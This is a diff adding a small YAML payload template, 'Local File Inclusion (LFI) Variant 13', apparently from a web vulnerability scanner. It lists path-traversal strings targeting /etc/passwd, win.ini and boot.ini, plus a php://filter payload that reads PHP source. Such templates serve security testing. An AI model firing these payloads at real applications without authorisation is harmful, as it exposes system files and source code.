@@ -1,0 +1,9 @@
+name: Local File Inclusion (LFI) Variant 13
+payloads:
+- ../../etc/passwd
+- ../../../../../../windows/win.ini
+- ../index.php
+- ../../../../boot.ini
+- php://filter/convert.base64-encode/resource=index.php
+severity: high
+type: lfi
